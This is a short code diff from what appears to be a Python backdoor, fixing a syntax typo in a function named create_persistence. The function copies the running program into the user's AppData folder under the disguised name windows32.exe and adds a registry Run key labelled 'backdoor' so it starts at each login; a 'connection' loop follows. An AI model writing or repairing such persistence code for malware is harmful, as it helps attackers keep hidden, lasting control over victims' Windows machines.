@@ -41,9 +41,10 @@ def recibir_datos():
  
 def create_persistence():
     location = os.environ['appdata'] + "\\windows32.exe"
-    reif not os.path.exists(location):
+    if not os.path.exists(location):
         shutil.copyfile(sys.executable,location)
         subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "' + location + '"', shell=True)
+        
 def connection():
     while True:
         time.sleep(2)
